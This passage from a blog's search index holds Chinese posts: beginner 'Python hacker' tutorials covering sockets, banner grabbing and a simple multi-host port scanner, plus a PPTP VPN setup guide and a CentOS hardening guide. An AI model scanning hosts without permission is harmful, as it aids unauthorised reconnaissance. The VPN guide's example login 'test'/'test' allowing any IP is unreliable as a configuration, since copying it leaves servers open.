22))&gt;&gt;&gt; s.send('Primal Security \n')17&gt;&gt;&gt; banner = s.recv(1024)&gt;&gt;&gt; print bannerOpenSSH 上面这个例子：我们先import这socket模块并且调用connect()函数去连接指定的IP地址与端口。它就会建立一个TCP连接(SYN/SYN-ACK/ACK)并且我们再通过send()函数给服务器发送一个真实的数据，然后使用recv()打印出响应的内容。现在教大家如何容错socket，对于不能打开的连接: 123456&gt;&gt;&gt;&gt;&gt;&gt; s.connect(('127.0.0.1', 23))Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in ? File "&lt;string&gt;", line 1, in connectsocket.error: (111, 'Connection refused') 对于上面的错误有若干中处理方式，这里我们使用最简单的一种方式：使用try/except循环来处理错误: 123456&gt;&gt;&gt;&gt;&gt;&gt; try:... s.connect(('127.0.0.1', 23))... except: pass...&gt;&gt;&gt; 现在就不会出现错误了，一行很简单的代码就让你的程序能够继续工作下去^_^。现在让我们使用之前学到的知识，使用for循环来写一个简单的端口扫描器: 1234567891011121314151617181920&gt;&gt;&gt;&gt;&gt;&gt; for port in range(20,25):... try:... print "[+] Attempting to connect to 127.0.0.1:"+str(port)... s.connect(('127.0.0.1', port))... s.send('Primal Security \n') ... banner = s.recv(1024)... if banner:... print "[+] Port "+str(port)+" open: "+banner... s.close()... except: pass...17[+] Attempting to connect to 127.0.0.1:20[+] Attempting to connect to 127.0.0.1:21[+] Attempting to connect to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Attempting to connect to 127.0.0.1:23[+] Attempting to connect to 127.0.0.1:24[+] Attempting to connect to 127.0.0.1:25 上面我们演示了使用try/except循环来处理当socket连接的时候遇到端口关闭的错误，同时上面还演示了如何使用”if”语句打印出可以连接成功的端口。下面我们将创建一个我们扫描指定端口的扫描器，这里的端口号，我们使用数组来存储，然后遍历这一个数组: 1234567891011&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt; for port in ports:... print port...22445804433389&gt;&gt;&gt; 如果我们想一次性扫描多台主机，可以使用一个for循环嵌套。最外层的是主机的ip，然后里面的for循环是端口。下面有一个基础的例子，展示了如何通过循环嵌套来构建一个简单的扫描器: 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt;&gt;&gt;&gt; hosts = ['127.0.0.1', '192.168.1.5', '10.0.0.1']&gt;&gt;&gt;&gt;&gt;&gt; ports = [22, 445, 80, 443, 3389]&gt;&gt;&gt;&gt;&gt;&gt; for host in hosts:... for port in ports:... try:... print "[+] Connecting to "+host+":"+str(port)... s.connect((host, port))... s.send('Primal Security \n')... banner = s.recv(1024)... if banner:... print "[+] Port "+str(port)+" open: "+banner... s.close()... except:pass...[+] Connecting to 127.0.0.1:22[+] Port 22 open: OpenSSH[+] Connecting to 127.0.0.1:445[+] Connecting to 127.0.0.1:80[+] Connecting to 127.0.0.1:443[+] Connecting to 127.0.0.1:3389[+] Connecting to 192.168.1.5:22[+] Connecting to 192.168.1.5:445[+] Connecting to 192.168.1.5:80[+] Connecting to 192.168.1.5:443[+] Connecting to 192.168.1.5:3389[+] Connecting to 10.0.0.1:22[+] Connecting to 10.0.0.1:445[+] Connecting to 10.0.0.1:80[+] Connecting to 10.0.0.1:443[+] Connecting to 10.0.0.1:3389 正如你所看到的结果，它把hosts数组里面的所有值都遍历了一次ports数组，等hosts[0]扫描完成之后再扫描hosts[1]依次类推。在这个例子里面你也可以修改里面的代码，只让它显示出可以打开的端口。 在这最后，你会发现还是Nmap最好用，但是我们将在后面的文章里面继续完善这个实例，大家可以花点时间去学习一些socket模块其他的功能函数，大家可以使用dir(socket)来了解更多，当然还有help().下一章]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x1]]></title>
    <url>%2F2015%2F10%2F13%2Fpythonhacker_0x1%2F</url>
    <content type="text"><![CDATA[入门(2)这一章将继续讲解一些基础的Python脚本概念,我们将把代码写入到一个脚本里面，函数，类和sys模块。 Python脚本框架下面是一个开始写Python脚本的基础例子，开始部分，我么告诉系统需要使用那一个解释器”#!/usr/bin/env python”,然后我们通过”def main():”声明一个main函数,最后2行代码有mian()的先执行。你可以定义在你的脚本里面定义其它函数，这样使得你的代码更容易的理解和修改维护： 12345678910#!/usr/bin/pythonimport &lt;module1&gt;, &lt;module2&gt; def myFunction(): def main(): myFunction() if __name__=="__main__": main() 函数 一种常见的写法是把每个功能函数分开写，执行一些操作之后然后返回结果。下面的这个伪代码演示的例子就能够很清晰的解释这个概念: 12345678# 声明函数/逻辑处理def MyFunction: ...do work... return output #在main函数里面调用:def main(): output = MyFunction(input) 类Python类开始使用的时候会有点困难，因为它是教你以何种方式设计你的代码，如果你掌握类的概念那么你就可以把数据和定义按照类的逻辑分组，这样类就拥有了属性和与之想关联的方法。当你定义一个类之后，你可以创建一个新的类，然后继承之前创建的类的属性和与之相关联的方法，这编程就叫做面向对象编程。 如果你感到迷惑，那么我建议你先不要去学习类，实际上，你并不需要类。但它可以让你的代码减少冗余。下面我们将定义个新的类”Domain”使用”class”关键字，当你实例化Domain类型对象的时候，它的类型有多种方式去定义: 1234567891011121314151617181920212223242526272829303132333435&gt;&gt;&gt; import os&gt;&gt;&gt; class Domain:... def __init__(self, domain, port, protocol):#通过两个内部变量存储变量... self.domain=domain... self.port=port... self.protocol=protocol#构造一个url的方法... def URL(self):... if self.protocol == 'https':... URL = 'https://'+self.domain+':'+self.port+'/'... if self.protocol == 'http':... URL = 'http://'+self.domain+':'+self.port+'/'... return URL# 调用os.system中主机命令lookup去解析域名... def lookup(self):... os.system("host "+self.domain)...&gt;&gt;&gt;&gt;&gt;&gt; domain=Domain('google.com', '443', 'https')&gt;&gt;&gt;&gt;&gt;&gt; dir(domain)['URL', '__doc__', '__init__', '__module__', 'ip', 'lookup', 'port', 'protocol']&gt;&gt;&gt; domain.URL()'https://8.8.8.8:443/'&gt;&gt;&gt; domain.ip'8.8.8.8'&gt;&gt;&gt; domain.port'443'&gt;&gt;&gt; domain.protocol'https'&gt;&gt;&gt; domain.lookup()google.com has address 74.125.228.233google.com has address 74.125.228.227google.com has address 74.125.228.232 正如你所看到的，当你实例化一个Domian类之后你可以运行类中的方法。再次说声，这个概念最初的时候很容易混乱，尤其是当你刚刚Python和编程的时候。尝试一下去实现一个新的类在你的Python脚本里面，我发现这是掌握这个概念最好的途径。 使用sys处理命令行输入值最好我们来介绍一下sys模块，它可以让你读取从命令终端输入的值并且帮你引入到脚本里面，它的语法很简单，sys.agrv[0]就是一个实际的脚本名，并在命令行指定的每个参数后面分配一个下标。下面是一个简单的例子: 123456789#!/usr/bin/pythonimport sysscript = sys.argv[0]ip = sys.argv[1]port = sys.argv[2]print "[+] The script name is: "+scriptprint "[+] The IP is: "+ip+" and the port is: "+port 当执行这个脚本的时候，并且后面跟三个参数执行之后的结果如下: 123~$ python sys.py 8.8.8.8 53[+] The script name is: sys.py[+] The IP is: 8.8.8.8 and the port is: 53 上面的只是一个例子，大家可以继续去研究其它Python模块，因为它们能够放你用最简单的方式解决你遇到的问题。下一章将会介绍使用Python进行网络连接并且写出一个基础的扫描器.]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x0]]></title>
    <url>%2F2015%2F10%2F12%2Fpythonhacker_0x0%2F</url>
    <content type="text"><![CDATA[入门 这将是第一个一系列关于python编程的博客文章。python是一门非常强大的语言，因为它有信息安全社区的支撑。这意味着很多工具都是由python编写并且可以在脚本中调用很多模块。使用模块的好处就是只需要少量的代码就能够完成所需的任务。 这篇文章假定你的系统是Linux，python版本是2.*。在写代码的时候你也可以直接的写在解释器里面(linux里面输入python即可进入)，也可以把代码放到一个文件里面。很多人会发现把代码存放到文件里面要比直接写在解释器上面要好很多。值得注意的是python 中强制缩进。大家在写函数声明，循环，if/else语句等等的时候就会发现。 python解释器在终端里面输入python: 12345~$ pythonPython 2.7.6 (default, Mar 22 2014, 22:59:56) [GCC 4.8.2] on linux2Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; 输入之后你就可以直接在解释器里面写你的代码了。下面我们将声明两个变量，并且使用type()函数查看变量的类型。假设我们声明了一个字符串和整型： 12345678910&gt;&gt;&gt;&gt;&gt;&gt; ip = '8.8.8.8'&gt;&gt;&gt; port = 53&gt;&gt;&gt;&gt;&gt;&gt; type(ip)&lt;type 'str'&gt;&gt;&gt;&gt;&gt;&gt;&gt; type(port)&lt;type 'int'&gt;&gt;&gt;&gt; 你可以使用内置的help()函数去了解一个函数的详细。记住这一点，它可以帮助你在学习语言的时候学习到更多的详细内容. 123&gt;&gt;&gt;&gt;&gt;&gt; help(type)&gt;&gt;&gt; 有时你会想把一些变量和字符串连接起来然后通过脚本显示出来。那么你就需要使用str()函数把整型转换成字符串类型 1234&gt;&gt;&gt; ip='1.1.1.1'&gt;&gt;&gt; port=55&gt;&gt;&gt; print 'the ip is:'+ip+'and the port is:'+str(port)the ip is:1.1.1.1and the port is:55 前面声明变量的时候”IP”就是一个字符串就不需要转换，而”port”就需要。现在你就已经知道了两个基本的数据类型(string和integer)。现在你可以试试使用内置函数与这两个数据类型写出其他的代码。 Python字符串允许你通过偏移值来获取你想需要的字符串,并且可以通过len()函数来获取字符串的长度，它可以帮助你更方便的操作字符串。 12345678910111213&gt;&gt;&gt;&gt;&gt;&gt; domain='primalsecurity.net'&gt;&gt;&gt; domain'primalsecurity.net'&gt;&gt;&gt; domain[0]'p'&gt;&gt;&gt; domain[0:3]'pri'&gt;&gt;&gt; domain[1:]'rimalsecurity.net' &gt;&gt;&gt; len(domain)18 你可以使用内建的dir()函数来列出模块定义的标识符。标识符有函数、类和变量。 12&gt;&gt;&gt; dir(ip)['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '_formatter_field_name_split', '_formatter_parser', 'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill'] 现在你可以使用上面列举出来的内建字符串函数，如果想知道这个函数的更多描述可以参考前面提到的help()函数: 123456789&gt;&gt;&gt;&gt;&gt;&gt; help(ip.split)&gt;&gt;&gt;&gt;&gt;&gt; string = ip+':'+str(port)&gt;&gt;&gt; string'8.8.8.8:53'&gt;&gt;&gt;&gt;&gt;&gt; string.split(':')['8.8.8.8', '53'] 这split函数把一个字符串通过”:”切割生成一个新的列表。这是一个非常有用的字符串函数因为你能够把这个字符串里面的有用信息提出出来。例如，你获取到了一个ip列表，你想在这个列表里面添加一个索引值。你也可以删除和添加新的值到这个列表里面通过.append()和.remove()函数 12345678910111213141516&gt;&gt;&gt;&gt;&gt;&gt; list = string.split(':')&gt;&gt;&gt;&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt;&gt;&gt;&gt; list[0]'8.8.8.8'&gt;&gt;&gt;&gt;&gt;&gt; list.append('google')&gt;&gt;&gt; list['8.8.8.8', '53', 'google']&gt;&gt;&gt; list.remove('google')&gt;&gt;&gt; list['8.8.8.8', '53']&gt;&gt;&gt; Python模块在上面提到过，Python模块能够让你用少量的代码就能够完成你的任务,Python有许多有用的内建模块(os,subprocess,socket,urllib,httplib,re,sys等等)和第三方模块(cymruwhois,scapy,dpkt,spider等等).使用Python模块很简单”import “. OS模块是非常重要的因为你需要在你的Python代码里面调用系统命令: 123456&gt;&gt;&gt;&gt;&gt;&gt; import os&gt;&gt;&gt;&gt;&gt;&gt; dir(os)['EX_CANTCREAT', 'EX_CONFIG', 'EX_DATAERR', 'EX_IOERR', 'EX_NOHOST', 'EX_NOINPUT', 'EX_NOPERM', 'EX_NOUSER', 'EX_OK', 'EX_OSERR', 'EX_OSFILE', 'EX_PROTOCOL', 'EX_SOFTWARE', 'EX_TEMPFAIL', 'EX_UNAVAILABLE', 'EX_USAGE', 'F_OK', 'NGROUPS_MAX', 'O_APPEND', 'O_ASYNC', 'O_CREAT', 'O_DIRECT', 'O_DIRECTORY', 'O_DSYNC', 'O_EXCL', 'O_LARGEFILE', 'O_NDELAY', 'O_NOATIME', 'O_NOCTTY', 'O_NOFOLLOW', 'O_NONBLOCK', 'O_RDONLY', 'O_RDWR', 'O_RSYNC', 'O_SYNC', 'O_TRUNC', 'O_WRONLY', 'P_NOWAIT', 'P_NOWAITO', 'P_WAIT', 'R_OK', 'SEEK_CUR', 'SEEK_END', 'SEEK_SET', 'ST_APPEND', 'ST_MANDLOCK', 'ST_NOATIME', 'ST_NODEV', 'ST_NODIRATIME', 'ST_NOEXEC', 'ST_NOSUID', 'ST_RDONLY', 'ST_RELATIME', 'ST_SYNCHRONOUS', 'ST_WRITE', 'TMP_MAX', 'UserDict', 'WCONTINUED', 'WCOREDUMP', 'WEXITSTATUS', 'WIFCONTINUED', 'WIFEXITED', 'WIFSIGNALED', 'WIFSTOPPED', 'WNOHANG', 'WSTOPSIG', 'WTERMSIG', 'WUNTRACED', 'W_OK', 'X_OK', '_Environ', '__all__', '__builtins__', '__doc__', '__file__', '__name__', '__package__', '_copy_reg', '_execvpe', '_exists', '_exit', '_get_exports_list', '_make_stat_result', '_make_statvfs_result', '_pickle_stat_result', '_pickle_statvfs_result', '_spawnvef', 'abort', 'access', 'altsep', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'ctermid', 'curdir', 'defpath', 'devnull', 'dup', 'dup2', 'environ', 'errno', 'error', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe', 'extsep', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fdopen', 'fork', 'forkpty', 'fpathconf', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'getcwd', 'getcwdu', 'getegid', 'getenv', 'geteuid', 'getgid', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getresgid', 'getresuid', 'getsid', 'getuid', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'linesep', 'link', 'listdir', 'lseek', 'lstat', 'major', 'makedev', 'makedirs', 'minor', 'mkdir', 'mkfifo', 'mknod', 'name', 'nice', 'open', 'openpty', 'pardir', 'path', 'pathconf', 'pathconf_names', 'pathsep', 'pipe', 'popen', 'popen2', 'popen3', 'popen4', 'putenv', 'read', 'readlink', 'remove', 'removedirs', 'rename', 'renames', 'rmdir', 'sep', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'stat', 'stat_float_times', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sys', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'tempnam', 'times', 'tmpfile', 'tmpnam', 'ttyname', 'umask', 'uname', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitpid', 'walk', 'write']&gt;&gt;&gt; 你可以看到上面os模块给你提供了很多可以使用的功能函数，其中我发现我经常使用”os.system”，我可给它传递一个命令，然后通过它去在系统底层执行我们传递的命令.下面我们将会执行一个命令”echo ‘UHJpbWFsIFNlY3VyaXR5Cg==’ | base64 -d”: 1234&gt;&gt;&gt;&gt;&gt;&gt; os.system("echo 'UHJpbWFsIFNlY3VyaXR5Cg==' | base64 -d")Primal Security&gt;&gt;&gt; 创建一个文件对象现在我们将演示一些例子,如何在Python里面从一个文件里面读取数据和创建一个文件。下面的这个例子演示了如何创建一个文件对象，并且读取/写入数据到这个对象里面，通常你自己读取一个文件的数据，并且做一些逻辑处理然后把输出的写到文件里面: 12345678&gt;&gt;&gt;&gt;&gt;&gt; file = open('test.txt', 'w')&gt;&gt;&gt; file.write('Hello World')&gt;&gt;&gt; file.close() &gt;&gt;&gt; file = open('test.txt', 'r')&gt;&gt;&gt; file.readlines()['Hello World']&gt;&gt;&gt; 在Python解释器里面练习上面的内容并且多加巩固，因为这些内容在后面的章节里面会经常使用，当我写代码的时候，我喜欢打开两个终端，一个用于执行python解释器，还有一个用来把逻辑写入到脚本里面。下一章将会写一个真实的Python脚本， 声明定义，类和sys模块。]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux搭建vpn服务器]]></title>
    <url>%2F2015%2F07%2F02%2Flinux-vpn%2F</url>
    <content type="text"><![CDATA[演示中使用的是Debain系统,但思路相同,好的我们开始吧 1、安装PPTPD1apt-get install pptpd 2、编辑pptpd.conf1vim /etc/pptpd.conf 使非注释的内容如下 123option /etc/ppp/pptpd-optionslocalip 192.168.0.1remoteip 192.168.0.234-238,192.168.0.245 这两句设置了当外部计算机通过pptp联接到vpn后所能拿到的ip地址范围和服务器的ip地址设置 3、添加登录用户1vim /etc/ppp/chap-secrets 添加一行，内容如下 123#client server secret IP addresses#用户名 pptpd 密码 允许连接IPtest pptpd "test" * 密码用引号括起来，最后那个星号是说允许从任何IP地址连接，如果你想单独设定IP地址也可以 理论上到这里一个vpn就已经搭建完毕了。不过你并不能通过这个来上Internet，因为所有的数据都作用于那台pptpd的服务器上， 而不会传入拨入的计算机设备上。要上Internet还需要配置iptables： 4、 设置DNS解析，编辑pptpd-options1vim /etc/ppp/pptpd-options 名称可能会不同，具体位置在/etc/pptpd.conf18行左右 找到ms-dns，取消掉注释，并修改DNS地址我用的是google dns，如下 : 12ms-dns 8.8.8.8ms-dns 8.8.4.4 5、 开启转发1vim /etc/sysctl.conf 取消如下内容行的注释 1net.ipv4.ip_forward=1 6、打开IP转发功能1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 7、设置iptables1iptables -t nat -I POSTROUTING -j MASQUERADE 8、 启动服务1/etc/init.d/pptpd restart VPN搭建完毕，可以尝试用客户端登录了。pptpd监听端口号为1723]]></content>
      <categories>
        <category>VPN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos7作为web服务器优化]]></title>
    <url>%2F2015%2F04%2F04%2Flinux-web%2F</url>
    <content type="text"><![CDATA[Centos7作为web服务器的一些简单配置 1. 关闭firewalld并替换iptables1234systemctl stop firewalld.service #停止firewallsystemctl disable firewalld.service #禁止firewall开机启动yum install iptables-services #安装iptables -nvL #查看规则 2. 加大打开文件数限制123456789vim /etc/security/limits.conf#添加如下内容:* soft nofile 1024000* hard nofile 1024000hive - nofile 1024000hive - nproc 1024000 ulimit -nulimit -a 查询当前配置 3. 更改用户进程限制123456vim /etc/security/limits.d/20-nproc.conf#更改一下内容* soft nproc 40960root soft nproc unlimited #无限制 此步骤需要重启机器生效，可以设置完后再重启 4. 网络线程优化vim /etc/sysctl.conf 1234567891011121314151617181920212223242526#加入如下内容# Disable IPv6net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1# Determines how often to check for stale neighbor entries.net.ipv4.neigh.default.gc_stale_time=120# Using arp_announce/arp_ignore to solve the ARP Problemnet.ipv4.conf.default.arp_announce = 2net.ipv4.conf.all.arp_announce=2vm.swappiness = 0net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_max_syn_backlog = 1024net.ipv4.tcp_synack_retries = 2net.ipv4.conf.lo.arp_announce=2net.ipv4.tcp_keepalive_time = 1800net.ipv4.tcp_keepalive_probes = 3net.ipv4.tcp_keepalive_intvl = 15net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30 执行/sbin/sysctl -p使设置生效 5. 时间校对123456789cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtimentpdate us.pool.ntp.orgcrontab -e0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTPservice crond restart 6. 关闭root登录并修改ssh端口1. 添加普通用户123groupadd poweruseradd -d /home/www/ -g power testpasswd test 2. iptables开启5233端口 5233为下面的更改后ssh端口, 此步骤须先于下面步骤，否则会造成ssh连不上的 vi /etc/sysconfig/iptables 添加 1-A INPUT -p tcp -m state --state NEW -m tcp --dport 5233 -j ACCEPT 执行/sbin/iptables restart 3. 修改sshd配置文件vim /etc/ssh/sshd_config 禁止root登陆把PermitRootLogin yes改为PermitRootLogin no 修改默认端口号把Port 22改为Port 5233最后执行systemctl restart sshd.service 7. 禁止ping12345678禁止echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all开启echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all#永久保存vi /etc/rc.d/rc.localecho 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all 8. 网络命令ifconfig,netstatyum -y install net-tools]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
</search>
